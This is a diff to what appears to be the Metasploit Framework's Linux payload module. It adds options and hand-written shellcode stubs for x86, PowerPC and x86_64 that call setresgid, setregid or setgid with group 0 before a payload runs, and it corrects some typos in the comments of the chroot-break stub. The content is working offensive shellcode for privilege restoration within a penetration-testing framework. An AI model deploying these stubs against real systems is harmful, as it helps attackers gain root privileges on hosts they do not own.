@@ -40,6 +40,27 @@ module Msf::Payload::Linux
 						"false"
 					]
 				),
+				Msf::OptBool.new('PrependSetresgid',
+					[
+						false,
+						"Prepend a stub that executes the setresgid(0, 0, 0) system call",
+						"false"
+					]
+				),
+				Msf::OptBool.new('PrependSetregid',
+					[
+						false,
+						"Prepend a stub that executes the setregid(0, 0) system call",
+						"false"
+					]
+				),
+				Msf::OptBool.new('PrependSetgid',
+					[
+						false,
+						"Prepend a stub that executes the setgid(0) system call",
+						"false"
+					]
+				),
 				Msf::OptBool.new('PrependChrootBreak',
 					[
 						false,
@@ -102,6 +123,31 @@ module Msf::Payload::Linux
 				       "\xcd\x80"              #   int     $0x80                      #
 			end
 
+			if (datastore['PrependSetresgid'])
+				# setresgid(0, 0, 0)
+				pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
+				       "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
+				       "\xf7\xe3"             +#   mull    %ebx                       #
+				       "\xb0\xaa"             +#   movb    $0xaa,%al                  #
+				       "\xcd\x80"              #   int     $0x80                      #
+			end
+
+			if (datastore['PrependSetregid'])
+				# setregid(0, 0)
+				pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
+				       "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
+				       "\x6a\x47"             +#   pushl   $0x47                      #
+				       "\x58"                 +#   popl    %eax                       #
+				       "\xcd\x80"              #   int     $0x80                      #
+			end
+
+			if (datastore['PrependSetgid'])
+				# setgid(0)
+				pre << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
+				       "\x6a\x2e"             +#   pushl   $0x2e                      #
+				       "\x58"                 +#   popl    %eax                       #
+				       "\xcd\x80"              #   int     $0x80                      #
+			end
 			if (datastore['PrependChrootBreak'])
 				# setreuid(0, 0)
 				pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
@@ -185,6 +231,33 @@ module Msf::Payload::Linux
 				       "\x44\xff\xff\x02"      #   sc                                 #
 			end
 
+			if (datastore['PrependSetresgid'])
+				# setresgid(0, 0, 0)
+				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
+				       "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\xab"     +#   addi    r0,r31,-341                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
+			if (datastore['PrependSetregid'])
+				# setregid(0, 0)
+				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\x48"     +#   addi    r0,r31,-440                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
+			if (datastore['PrependSetgid'])
+				# setgid(0)
+				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
+				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
+				       "\x38\x1f\xfe\x2f"     +#   addi    r0,r31,-465                #
+				       "\x44\xff\xff\x02"      #   sc                                 #
+			end
+
 			if (datastore['PrependChrootBreak'])
 				# setreuid(0, 0)
 				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
@@ -235,6 +308,33 @@ module Msf::Payload::Linux
 				pre << "\x0f\x05"             #    syscall                           #
 			end
 
+			if (datastore['PrependSetresgid'])
+				# setresgid(0, 0, 0)
+				pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
+				pre << "\x6a\x77"             #    push    0x77                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
+			end
+
+			if (datastore['PrependSetregid'])
+				# setregid(0, 0)
+				pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
+				pre << "\x48\x89\xf2"         #    mov     rdx,rsi                   #
+				pre << "\x6a\x72"             #    push    0x72                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
+			end
+
+			if (datastore['PrependSetgid'])
+				# setgid(0)
+				pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x6a\x6a"             #    push    0x6a                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
+			end
+
 			if (datastore['PrependChrootBreak'])
 
 				# setreuid(0, 0)
@@ -269,7 +369,7 @@ module Msf::Payload::Linux
 				pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
 
 				# loop chdir(..) 69 times
-				# syscall tendo to modify rcx can't use loop...
+				# syscall tend to modify rcx can't use loop...
 				pre << "\x6a\x45"             #    push    0x45                      #
 				pre << "\x5b"                 #    pop     rbx                       #
 				pre << "\x6a\x50"             #    push    0x50                      #
@@ -278,7 +378,7 @@ module Msf::Payload::Linux
 				pre << "\xfe\xcb"             #    dec     bl                        #
 				pre << "\x75\xf7"             #    jnz     -7                        #
 
-				# chrot (.) (witch should by /)
+				# chroot (.) (which should be /)
 				pre << "\x6a\x2e"             #    push    .  (0x2e)                 #
 				pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
 				pre << "\x48\x89\xd0"         #    mov     rax,rdx                   #
